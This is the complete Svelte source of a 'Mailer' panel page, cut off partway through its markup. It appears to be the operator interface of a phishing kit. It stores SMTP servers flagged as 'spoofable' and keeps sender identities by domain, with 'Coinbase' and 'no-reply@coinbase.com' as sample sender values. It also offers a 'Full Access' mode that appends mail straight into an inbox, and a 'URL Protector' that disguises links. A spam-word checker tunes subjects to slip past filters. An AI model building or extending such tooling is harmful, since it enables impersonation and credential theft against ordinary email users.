<script lang="ts">
	import { onMount } from 'svelte';
	import {
		Mail,
		Send,
		Plus,
		Trash2,
		FileText,
		Server,
		Eye,
		Code,
		X,
		CheckCircle,
		AlertCircle,
		Loader,
		ShieldCheck,
		ShieldAlert,
		TriangleAlert,
		Info,
		Save,
		Bookmark,
		Link as LinkIcon,
		Copy,
		Check,
		ExternalLink,
		ToggleLeft,
		ToggleRight,
		RefreshCw,
		Search,
		BarChart3,
		Activity,
		Globe,
		Monitor,
		Smartphone
	} from 'lucide-svelte';
	import { sendMessage, mailerResult, mailerSmtpSync, mailerSendersSync } from '$lib/stores/websocket';
	import { toast } from '$lib/stores/toast';
	import {
		extractTemplateVariables,
		replaceTemplateVariables,
		variableLabel
	} from '$lib/mailVariables';
	import { isAutoDateMailToken, mergeAutoDateVariables } from '$lib/dateVars';

	interface SmtpServer {
		id: string;
		label: string;
		host: string;
		port: number;
		user: string;
		useSSL: boolean;
		spoofable: boolean;
		createdBy: string;
		createdAt: number;
		hasPassword: boolean;
	}

	interface SenderIdentity {
		id: string;
		label: string;
		domain: string;
		fromEmail: string;
		fromName: string;
		smtpId: string;
		notes: string;
		createdBy: string;
		createdAt: number;
	}
	interface Template {
		id: string;
		slug: string;
		name: string;
		subject: string;
		html: string;
		variables: string[];
		ownerUsername: string;
		shared: boolean;
	}
	interface Preset {
		id: string;
		name: string;
		smtpId: string;
		templateSlug: string;
		senderName: string;
		senderEmail: string;
		replyTo: string;
		subject: string;
		sendMode: 'smtp' | 'mail-server';
	}
	interface ProtectedUrl {
		id: string;
		shortCode: string;
		originalUrl: string;
		domain: string;
		clicks: number;
		status: 'active' | 'inactive';
		createdAt: number;
		expiresAt: number;
	}

	let activeTab = $state<'sender' | 'smtp' | 'log' | 'protector'>('sender');

	// Sender state
	let templates: Template[] = $state([]);
	let smtpServers: SmtpServer[] = $state([]);
	let senderIdentities: SenderIdentity[] = $state([]);
	let presets: Preset[] = $state([]);
	let selectedSmtp = $state('');
	let selectedSenderId = $state('');
	let recipientList = $state('');
	let selectedTemplateId = $state<string>('');
	let customSubject = $state('');
	let senderEmail = $state('');
	let senderName = $state('');
	let replyTo = $state('');
	let ccField = $state('');
	let bccField = $state('');
	let fullAccessMode = $state(false);
	let sendMode = $state<'smtp' | 'mail-server'>('smtp');
	let editingTemplate = $state(false);
	let showAddSmtp = $state(false);
	let showAddSender = $state(false);
	let showSavePreset = $state(false);
	let presetName = $state('');
	let presetMenuOpen = $state(false);
	let previewMode = $state<'desktop' | 'mobile'>('desktop');

	const SMTP_PROVIDERS = [
		{ id: 'custom', label: 'Custom', host: '', port: '587', ssl: false },
		{ id: 'gmail', label: 'Gmail (App Password)', host: 'smtp.gmail.com', port: '587', ssl: false },
		{ id: 'outlook', label: 'Outlook / Hotmail', host: 'smtp.office365.com', port: '587', ssl: false },
		{ id: 'yahoo', label: 'Yahoo', host: 'smtp.mail.yahoo.com', port: '587', ssl: false },
		{ id: 'zoho', label: 'Zoho', host: 'smtp.zoho.com', port: '465', ssl: true },
		{ id: 'icloud', label: 'iCloud', host: 'smtp.mail.me.com', port: '587', ssl: false },
		{ id: 'ses', label: 'Amazon SES', host: 'email-smtp.us-east-1.amazonaws.com', port: '587', ssl: false }
	];
	let testingConnection = $state(false);
	let testResult = $state<{ ok: boolean; error?: string } | null>(null);
	let smtpProvider = $state('custom');
	function onProviderChange() {
		const p = SMTP_PROVIDERS.find((x) => x.id === smtpProvider);
		if (!p || p.id === 'custom') return;
		newSmtpHost = p.host;
		newSmtpPort = p.port;
		newSmtpSSL = p.ssl;
		newSmtpLabel = p.label;
	}

	async function testConnection() {
		if (!newSmtpUser.trim() || !newSmtpPass.trim()) {
			toast.error('Enter credentials first');
			return;
		}
		testingConnection = true;
		testResult = null;
		try {
			const isGmailLike = ['smtp.gmail.com', 'imap.gmail.com'].includes(newSmtpHost.trim());
			const res = await fetch('/api/mailer/test', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(
					isGmailLike
						? { mode: 'imap', host: 'imap.gmail.com', port: 993, user: newSmtpUser.trim(), password: newSmtpPass.trim() }
						: editingSmtpId
							? { smtpId: editingSmtpId }
							: { mode: 'imap', host: newSmtpHost.replace('smtp.', 'imap.'), port: 993, user: newSmtpUser.trim(), password: newSmtpPass.trim() }
				)
			});
			if (res.ok) {
				testResult = await res.json();
				if (testResult?.ok) toast.success('Connection verified');
				else toast.error(testResult?.error || 'Connection failed');
			} else {
				testResult = { ok: false, error: 'Test request failed' };
			}
		} catch (err: any) {
			testResult = { ok: false, error: err?.message || 'Test failed' };
		} finally {
			testingConnection = false;
		}
	}

	// Email log state
	interface EmailLogRow {
		id: number; smtpId: string; smtpLabel: string; fromEmail: string; fromName: string;
		toAddr: string; cc: string; bcc: string; replyTo: string; subject: string;
		templateSlug: string; status: string; messageId: string; error: string;
		sentBy: string; createdAt: number;
	}
	let emailLog: EmailLogRow[] = $state([]);
	let emailLogTotal = $state(0);
	let emailLogPage = $state(1);
	let emailLogSearch = $state('');
	let emailLogStatus = $state('');
	let emailLogLoading = $state(false);

	async function fetchEmailLog() {
		emailLogLoading = true;
		try {
			const params = new URLSearchParams({ page: String(emailLogPage), limit: '25' });
			if (emailLogSearch.trim()) params.set('search', emailLogSearch.trim());
			if (emailLogStatus) params.set('status', emailLogStatus);
			const res = await fetch(`/api/mailer/log?${params}`);
			if (res.ok) {
				const data = await res.json();
				emailLog = data.rows || [];
				emailLogTotal = data.total || 0;
			}
		} finally {
			emailLogLoading = false;
		}
	}

	async function clearEmailLog() {
		if (!confirm('Clear all email send history?')) return;
		const res = await fetch('/api/mailer/log', { method: 'DELETE' });
		if (res.ok) { emailLog = []; emailLogTotal = 0; toast.success('Log cleared'); }
	}

	function exportEmailLogCsv() {
		if (!emailLog.length) { toast.error('No log entries'); return; }
		const lines = [['Time', 'From', 'To', 'Subject', 'Template', 'SMTP', 'Status', 'Error', 'Sent By'].join(',')];
		for (const r of emailLog) {
			lines.push([
				new Date(r.createdAt).toISOString(),
				`"${(r.fromName ? r.fromName + ' ' : '') + r.fromEmail}"`,
				`"${r.toAddr}"`, `"${r.subject.replace(/"/g, '""')}"`,
				r.templateSlug, `"${r.smtpLabel}"`, r.status, `"${r.error.replace(/"/g, '""')}"`, r.sentBy
			].join(','));
		}
		const blob = new Blob([lines.join('\n')], { type: 'text/csv' });
		const a = document.createElement('a');
		a.href = URL.createObjectURL(blob);
		a.download = `email-log-${Date.now()}.csv`;
		a.click();
	}

	// SMTP modal state
	let newSmtpLabel = $state('');
	let newSmtpHost = $state('');
	let newSmtpPort = $state('465');
	let newSmtpUser = $state('');
	let newSmtpPass = $state('');
	let newSmtpSSL = $state(false);
	let newSmtpSpoofable = $state(false);
	let editingSmtpId = $state('');

	let newSenderLabel = $state('');
	let newSenderDomain = $state('');
	let newSenderEmail = $state('');
	let newSenderName = $state('');
	let newSenderSmtpId = $state('');
	let newSenderNotes = $state('');

	let sending = $state(false);
	let sendStatus: { type: 'success' | 'error'; message: string } | null = $state(null);
	let variableValues: Record<string, string> = $state({});

	let currentTemplate = $derived(templates.find((t) => t.id === selectedTemplateId));

	let templateVariables = $derived.by(() => {
		if (!currentTemplate) return [] as string[];
		const fromHtml = extractTemplateVariables(currentTemplate.html);
		const merged = new Set([...(currentTemplate.variables || []), ...fromHtml]);
		return [...merged];
	});

	let manualTemplateVariables = $derived(
		templateVariables.filter((v) => !isAutoDateMailToken(v))
	);

	function getFilledHtml(html: string): string {
		return replaceTemplateVariables(html, variableValues);
	}

	let previewHtml = $derived(
		currentTemplate
			? getFilledHtml(currentTemplate.html)
			: '<p style="color:#888;text-align:center;padding:40px;">Select a template to preview</p>'
	);

	let lastTemplateId = $state('');

	$effect(() => {
		if (!selectedTemplateId || selectedTemplateId === lastTemplateId) return;
		lastTemplateId = selectedTemplateId;
		variableValues = mergeAutoDateVariables({});
		const tmpl = templates.find((t) => t.id === selectedTemplateId);
		if (tmpl?.subject) customSubject = tmpl.subject;
	});

	mailerResult.subscribe((result) => {
		if (!result) return;
		sending = false;
		if (result.failed === 0) {
			sendStatus = { type: 'success', message: `Sent ${result.sent}/${result.total} emails successfully` };
		} else if (result.sent > 0) {
			sendStatus = { type: 'error', message: `${result.sent} sent, ${result.failed} failed: ${result.errors[0]}` };
		} else {
			sendStatus = { type: 'error', message: result.errors[0] || 'All emails failed to send' };
		}
		setTimeout(() => { sendStatus = null; }, 8000);
	});

	async function fetchTemplates() {
		const res = await fetch('/api/templates');
		if (res.ok) {
			const data = await res.json();
			templates = data.templates;
		}
	}

	async function fetchPresets() {
		const res = await fetch('/api/mailer-presets');
		if (res.ok) {
			const data = await res.json();
			presets = data.presets;
		}
	}

	async function fetchProtectedUrls() {
		const res = await fetch('/api/protected-urls');
		if (res.ok) {
			const data = await res.json();
			urls = data.urls;
			urlStats = data.stats;
		}
	}

	async function fetchSmtpServers() {
		const res = await fetch('/api/mailer/smtp');
		if (res.ok) {
			const data = await res.json();
			smtpServers = data.servers || [];
			if (!selectedSmtp && smtpServers.length > 0) selectedSmtp = smtpServers[0].id;
		}
	}

	async function fetchSenderIdentities() {
		const res = await fetch('/api/mailer/senders');
		if (res.ok) {
			const data = await res.json();
			senderIdentities = data.senders || [];
		}
	}

	function applySenderProfile(id: string) {
		selectedSenderId = id;
		if (!id) return;
		const s = senderIdentities.find((x) => x.id === id);
		if (!s) return;
		senderEmail = s.fromEmail;
		senderName = s.fromName || senderName;
		if (s.smtpId) selectedSmtp = s.smtpId;
	}

	mailerSmtpSync.subscribe((payload) => {
		if (payload?.servers) {
			smtpServers = payload.servers;
			if (!selectedSmtp && smtpServers.length > 0) selectedSmtp = smtpServers[0].id;
		}
	});

	mailerSendersSync.subscribe((payload) => {
		if (payload?.senders) senderIdentities = payload.senders;
	});

	onMount(() => {
		fetchTemplates();
		fetchPresets();
		fetchProtectedUrls();
		fetchSmtpServers();
		fetchSenderIdentities();
	});

	function sendCampaign() {
		const recipients = recipientList.split('\n').map((r) => r.trim()).filter(Boolean);
		if (!currentTemplate) return;
		if (!fullAccessMode && recipients.length === 0) return;
		if (!selectedSmtp) return;

		sending = true;
		sendStatus = null;

		const filledHtml = getFilledHtml(currentTemplate.html);
		const filledSubject = getFilledHtml(customSubject || currentTemplate.subject || '');

		if (!sendMessage('mailer:send', {
			templateId: currentTemplate.slug,
			recipients,
			subject: filledSubject,
			html: filledHtml,
			senderEmail: senderEmail || undefined,
			senderName: senderName || undefined,
			replyTo: replyTo || undefined,
			cc: ccField || undefined,
			bcc: bccField || undefined,
			smtpId: selectedSmtp || undefined,
			fullAccess: fullAccessMode,
			sendMode
		})) {
			sending = false;
			toast.error('Not connected to server');
			return;
		}
	}

	async function addSmtp() {
		if (!newSmtpHost.trim() || !newSmtpUser.trim()) return;
		if (!editingSmtpId && !newSmtpPass.trim()) {
			toast.error('SMTP password is required for new servers');
			return;
		}
		const id = editingSmtpId || crypto.randomUUID();
		const res = await fetch('/api/mailer/smtp', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				id,
				label: newSmtpLabel.trim() || newSmtpHost.trim(),
				host: newSmtpHost.trim(),
				port: parseInt(newSmtpPort, 10) || 587,
				user: newSmtpUser.trim(),
				password: newSmtpPass,
				useSSL: newSmtpSSL,
				spoofable: newSmtpSpoofable
			})
		});
		if (!res.ok) {
			const err = await res.json().catch(() => ({}));
			toast.error((err as { message?: string }).message || 'Failed to save SMTP server');
			return;
		}
		await fetchSmtpServers();
		selectedSmtp = id;
		toast.success(editingSmtpId ? 'SMTP server updated' : 'SMTP server saved for all users');
		newSmtpLabel = '';
		newSmtpHost = '';
		newSmtpPort = '465';
		newSmtpUser = '';
		newSmtpPass = '';
		newSmtpSSL = false;
		newSmtpSpoofable = false;
		editingSmtpId = '';
		showAddSmtp = false;
	}

	function openEditSmtp(smtp: SmtpServer) {
		editingSmtpId = smtp.id;
		newSmtpLabel = smtp.label;
		newSmtpHost = smtp.host;
		newSmtpPort = String(smtp.port);
		newSmtpUser = smtp.user;
		newSmtpPass = '';
		newSmtpSSL = smtp.useSSL;
		newSmtpSpoofable = smtp.spoofable;
		showAddSmtp = true;
	}

	async function removeSmtp(id: string) {
		const res = await fetch(`/api/mailer/smtp/${encodeURIComponent(id)}`, { method: 'DELETE' });
		if (!res.ok) {
			toast.error('Failed to remove SMTP server');
			return;
		}
		if (selectedSmtp === id) selectedSmtp = '';
		await fetchSmtpServers();
		toast.success('SMTP server removed');
	}

	async function addSender() {
		if (!newSenderDomain.trim() || !newSenderEmail.trim()) {
			toast.error('Domain and from email are required');
			return;
		}
		const res = await fetch('/api/mailer/senders', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				label: newSenderLabel.trim() || newSenderEmail.trim(),
				domain: newSenderDomain.trim(),
				fromEmail: newSenderEmail.trim(),
				fromName: newSenderName.trim(),
				smtpId: newSenderSmtpId,
				notes: newSenderNotes.trim()
			})
		});
		if (!res.ok) {
			const err = await res.json().catch(() => ({}));
			toast.error((err as { message?: string }).message || 'Failed to save sender');
			return;
		}
		await fetchSenderIdentities();
		toast.success('Sender domain saved for all users');
		newSenderLabel = '';
		newSenderDomain = '';
		newSenderEmail = '';
		newSenderName = '';
		newSenderSmtpId = '';
		newSenderNotes = '';
		showAddSender = false;
	}

	async function removeSender(id: string) {
		const res = await fetch(`/api/mailer/senders/${encodeURIComponent(id)}`, { method: 'DELETE' });
		if (!res.ok) {
			toast.error('Failed to remove sender');
			return;
		}
		if (selectedSenderId === id) selectedSenderId = '';
		await fetchSenderIdentities();
		toast.success('Sender removed');
	}

	async function savePreset() {
		if (!presetName.trim()) return;
		const res = await fetch('/api/mailer-presets', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				name: presetName,
				smtpId: selectedSmtp,
				templateSlug: currentTemplate?.slug || '',
				senderName,
				senderEmail,
				replyTo,
				subject: customSubject,
				sendMode
			})
		});
		if (res.ok) {
			await fetchPresets();
			showSavePreset = false;
			presetName = '';
		}
	}

	async function deletePreset(p: Preset) {
		await fetch(`/api/mailer-presets/${p.id}`, { method: 'DELETE' });
		await fetchPresets();
	}

	function loadPreset(p: Preset) {
		selectedSmtp = p.smtpId;
		const tmpl = templates.find((t) => t.slug === p.templateSlug);
		if (tmpl) selectedTemplateId = tmpl.id;
		senderName = p.senderName;
		senderEmail = p.senderEmail;
		replyTo = p.replyTo;
		customSubject = p.subject;
		sendMode = p.sendMode;
		presetMenuOpen = false;
	}

	function clearForm() {
		recipientList = '';
		customSubject = '';
		senderEmail = '';
		senderName = '';
		replyTo = '';
		variableValues = {};
		selectedTemplateId = '';
		lastTemplateId = '';
	}

	// --- Spam analysis (kept from previous version) ---
	const SPAM_TRIGGER_WORDS = [
		'urgent', 'act now', 'action required', 'immediate', 'limited time',
		'expires', 'last chance', 'don\'t miss', 'hurry', 'order now',
		'click here', 'click below', 'buy now', 'free', 'winner',
		'congratulations', 'you\'ve won', 'prize', 'guaranteed', 'no risk',
		'risk-free', 'no obligation', '100%', 'cash', 'earn money',
		'make money', 'extra income', 'financial freedom', 'investment',
		'double your', 'million', 'billion', 'pure profit',
		'apply now', 'call now', 'deal', 'discount', 'offer',
		'lowest price', 'affordable', 'bargain', 'bonus',
		'dear friend', 'dear customer', 'important notice',
		'verify your account', 'confirm your identity', 'suspended',
		'unauthorized', 'security alert', 'unusual activity',
		'password expired', 'account locked', 'billing problem'
	];

	interface SpamWarning {
		severity: 'critical' | 'warning' | 'info';
		field: string;
		message: string;
	}

	function analyzeSpam(subject: string, name: string, email: string): SpamWarning[] {
		const w: SpamWarning[] = [];
		const sub = (subject || currentTemplate?.subject || '').toLowerCase();
		for (const word of SPAM_TRIGGER_WORDS) {
			if (sub.includes(word)) {
				w.push({ severity: 'warning', field: 'Subject', message: `Contains "${word}"` });
			}
		}
		if (subject && subject === subject.toUpperCase() && subject.length > 3) {
			w.push({ severity: 'critical', field: 'Subject', message: 'Subject is ALL CAPS' });
		}
		const exclamations = (subject.match(/!/g) || []).length;
		if (exclamations > 1) {
			w.push({ severity: 'warning', field: 'Subject', message: `${exclamations} exclamation marks` });
		}
		if (subject.startsWith('Re:') || subject.startsWith('Fwd:')) {
			w.push({ severity: 'critical', field: 'Subject', message: 'Fake reply/forward prefix' });
		}
		if (email && (email.includes('noreply') || email.includes('no-reply'))) {
			w.push({ severity: 'info', field: 'Sender Email', message: 'Using a no-reply address' });
		}
		return w;
	}

	let spamWarnings = $derived(analyzeSpam(customSubject, senderName, senderEmail));
	let spamScore = $derived(() => {
		let s = 100;
		for (const w of spamWarnings) {
			if (w.severity === 'critical') s -= 25;
			else if (w.severity === 'warning') s -= 10;
			else s -= 3;
		}
		return Math.max(0, s);
	});

	// --- URL Protector state ---
	let urls: ProtectedUrl[] = $state([]);
	let urlStats = $state<{ total: number; clicks: number; active: number }>({ total: 0, clicks: 0, active: 0 });
	let urlSearch = $state('');
	let showAddUrl = $state(false);
	let newUrlOriginal = $state('');
	let newUrlDomain = $state('');
	let newUrlExpires = $state('');
	let copiedShort = $state<string | null>(null);

	let filteredUrls = $derived(
		urls.filter((u) => {
			if (!urlSearch.trim()) return true;
			const q = urlSearch.toLowerCase();
			return u.shortCode.toLowerCase().includes(q) || u.originalUrl.toLowerCase().includes(q);
		})
	);

	function shortLink(u: ProtectedUrl): string {
		const origin = typeof window !== 'undefined' ? window.location.origin : '';
		return `${origin}/u/${u.shortCode}`;
	}

	function copyShort(u: ProtectedUrl) {
		navigator.clipboard?.writeText(shortLink(u));
		copiedShort = u.id;
		toast.success('Short link copied to clipboard');
		setTimeout(() => (copiedShort = null), 1200);
	}

	async function addUrl() {
		if (!newUrlOriginal.trim()) return;
		const expires = parseInt(newUrlExpires, 10);
		const res = await fetch('/api/protected-urls', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				originalUrl: newUrlOriginal.trim(),
				domain: newUrlDomain.trim(),
				expiresInSeconds: Number.isFinite(expires) && expires > 0 ? expires : 0
			})
		});
		if (res.ok) {
			newUrlOriginal = '';
			newUrlDomain = '';
			newUrlExpires = '';
			showAddUrl = false;
			await fetchProtectedUrls();
		}
	}

	async function toggleUrl(u: ProtectedUrl) {
		const next = u.status === 'active' ? 'inactive' : 'active';
		await fetch(`/api/protected-urls/${u.id}`, {
			method: 'PATCH',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ status: next })
		});
		await fetchProtectedUrls();
	}

	async function deleteUrl(u: ProtectedUrl) {
		if (!confirm(`Delete short link /${u.shortCode}?`)) return;
		await fetch(`/api/protected-urls/${u.id}`, { method: 'DELETE' });
		await fetchProtectedUrls();
	}

	function fmtDate(ts: number) {
		if (!ts) return '—';
		try { return new Date(ts).toLocaleDateString(); } catch { return '—'; }
	}
</script>

<svelte:head>
	<title>Mailer · Panel</title>
</svelte:head>

<div class="p-8 pt-5">
	<div class="mb-5 flex flex-wrap items-start justify-between gap-3">
		<div>
			<h1 class="text-2xl font-bold text-[var(--foreground)]">Mailer</h1>
			<p class="mt-1 text-sm text-[var(--muted-foreground)]">Send emails, manage SMTP servers, and protect URLs</p>
		</div>
		{#if activeTab === 'sender'}
			<div class="flex flex-wrap items-center gap-2">
				<button onclick={clearForm} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-2 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
					<X size={12} />
					Clear
				</button>
				<button
					onclick={sendCampaign}
					disabled={sending || !selectedSmtp || !currentTemplate || smtpServers.length === 0}
					class="btn-accent flex items-center gap-2 rounded-lg px-4 py-2 text-xs disabled:cursor-not-allowed disabled:opacity-50"
				>
					{#if sending}
						<Loader size={13} class="animate-spin" />
						Sending...
					{:else}
						<Send size={13} />
						{fullAccessMode ? 'Append to inbox' : 'Send Email'}
					{/if}
				</button>
			</div>
		{/if}
	</div>

	<!-- Tabs -->
	<div class="mb-5 flex items-center gap-1 rounded-xl border border-[var(--border)] bg-[var(--card)] p-1 w-fit">
		<button
			onclick={() => (activeTab = 'sender')}
			class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'sender' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
		>
			<Mail size={13} />
			Email Sender
		</button>
		<button
			onclick={() => (activeTab = 'smtp')}
			class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'smtp' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
		>
			<Server size={13} />
			SMTP Servers
		</button>
		<button
			onclick={() => { activeTab = 'log'; fetchEmailLog(); }}
			class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'log' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
		>
			<Activity size={13} />
			Email Log
		</button>
		<button
			onclick={() => (activeTab = 'protector')}
			class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'protector' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
		>
			<LinkIcon size={13} />
			URL Protector
		</button>
	</div>

	{#if activeTab === 'sender'}
		<!-- ============= EMAIL SENDER ============= -->
		<div class="grid gap-4 xl:grid-cols-2">
			<!-- LEFT: configuration -->
			<div class="space-y-4">
				<!-- Presets + send mode -->
				<div class="flex flex-wrap items-center justify-between gap-2 rounded-xl border border-[var(--border)] bg-[var(--card)] px-4 py-2.5">
					<div class="flex flex-wrap items-center gap-2">
						<button onclick={() => (showSavePreset = true)} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
							<Bookmark size={11} />
							Save as Preset
						</button>
						<div class="relative">
							<button onclick={() => (presetMenuOpen = !presetMenuOpen)} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
								<FileText size={11} />
								Load Preset
								{#if presets.length > 0}
									<span class="ml-1 rounded bg-[var(--accent-primary)]/10 px-1.5 py-0.5 text-[10px] font-bold text-[var(--text-accent)]">{presets.length}</span>
								{/if}
							</button>
							{#if presetMenuOpen}
								<div class="absolute left-0 top-full z-30 mt-1 w-72 rounded-lg border border-[var(--border)] bg-[var(--card)] py-1 shadow-2xl">
									{#if presets.length === 0}
										<p class="px-4 py-3 text-xs text-[var(--muted-foreground)]">No saved presets yet.</p>
									{:else}
										{#each presets as p (p.id)}
											<div class="group flex items-center justify-between gap-2 px-3 py-2 hover:bg-[var(--accent)]/30">
												<button onclick={() => loadPreset(p)} class="flex-1 truncate text-left text-xs text-[var(--foreground)]">
													<p class="truncate font-medium">{p.name}</p>
													<p class="truncate text-[10px] text-[var(--muted-foreground)]">{p.senderEmail || 'no sender'}</p>
												</button>
												<button onclick={() => deletePreset(p)} class="rounded p-1 text-[var(--muted-foreground)] opacity-0 hover:bg-[var(--destructive)]/15 hover:text-[var(--destructive)] group-hover:opacity-100" aria-label="Delete preset">
													<Trash2 size={11} />
												</button>
											</div>
										{/each}
									{/if}
								</div>
							{/if}
						</div>
					</div>
					<div class="flex items-center gap-2">
						<div class="flex items-center gap-1 rounded-lg border border-[var(--border)] p-0.5">
							<button onclick={() => (sendMode = 'smtp')} class="rounded-md px-3 py-1.5 text-xs {sendMode === 'smtp' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}">Custom SMTP</button>
							<button onclick={() => (sendMode = 'mail-server')} class="rounded-md px-3 py-1.5 text-xs {sendMode === 'mail-server' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}">Mail Server</button>
						</div>
						<button
							onclick={() => (fullAccessMode = !fullAccessMode)}
							class="flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-xs transition-soft {fullAccessMode ? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]' : 'border-[var(--border)] text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
						>
							{#if fullAccessMode}<ToggleRight size={12} />{:else}<ToggleLeft size={12} />{/if}
							Full Access
						</button>
					</div>
				</div>

				<!-- Compose card -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center gap-2">
						<Mail size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Email Configuration</p>
					</div>
					<div class="p-4 space-y-3">
						<div class="grid grid-cols-1 gap-3 sm:grid-cols-3">
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Saved sender (domain)</label>
								<select
									value={selectedSenderId}
									onchange={(e) => applySenderProfile((e.target as HTMLSelectElement).value)}
									class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
								>
									<option value="">Custom sender fields...</option>
									{#each senderIdentities as s}
										<option value={s.id}>{s.label} — {s.fromEmail}</option>
									{/each}
								</select>
							</div>
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">{sendMode === 'smtp' ? 'SMTP Configuration' : 'Mail Server'}</label>
								<select bind:value={selectedSmtp} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
									<option value="">Select SMTP configuration...</option>
									{#each smtpServers as smtp}
										<option value={smtp.id}>{smtp.label} — {smtp.user}@{smtp.host}</option>
									{/each}
								</select>
							</div>
							<div>
								<div class="mb-1 flex items-center justify-between">
									<label for="mailer-template-select" class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">
										Email Template
									</label>
									{#if selectedTemplateId}
										<button
											onclick={() => (editingTemplate = !editingTemplate)}
											aria-label="Edit template HTML inline"
											aria-pressed={editingTemplate}
											title={editingTemplate ? 'Close inline editor' : 'Edit HTML inline'}
											class="flex items-center gap-1 rounded px-1.5 py-0.5 text-[10px] text-[var(--text-accent)] transition-soft hover:bg-[var(--accent)]"
										>
											<Code size={10} />
											{editingTemplate ? 'Done' : 'Edit HTML'}
										</button>
									{/if}
								</div>
								<select id="mailer-template-select" bind:value={selectedTemplateId} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
									<option value="">Select template...</option>
									{#each templates as t}
										<option value={t.id}>{t.name}{t.shared ? ' (shared)' : ''}</option>
									{/each}
								</select>
							</div>
						</div>
					</div>
				</div>

				<!-- Email details card -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center gap-2">
						<Send size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Email Details</p>
					</div>
					<div class="p-4 space-y-3">
						{#if !fullAccessMode}
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">To <span class="text-red-400">*</span></label>
								<textarea bind:value={recipientList} rows={2} placeholder="recipient@example.com" class="w-full resize-y rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"></textarea>
							</div>
						{/if}
						<div>
							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Subject <span class="text-red-400">*</span></label>
							<input bind:value={customSubject} type="text" placeholder={currentTemplate?.subject || 'Email subject line'} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
						</div>
						<div class="grid grid-cols-2 gap-3">
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Sender Name</label>
								<input bind:value={senderName} type="text" placeholder="Coinbase" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</div>
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Sender Email</label>
								<input bind:value={senderEmail} type="email" placeholder="no-reply@coinbase.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</div>
						</div>
						<div>
							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Reply-To Email</label>
							<input bind:value={replyTo} type="email" placeholder="reply@company.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
						</div>
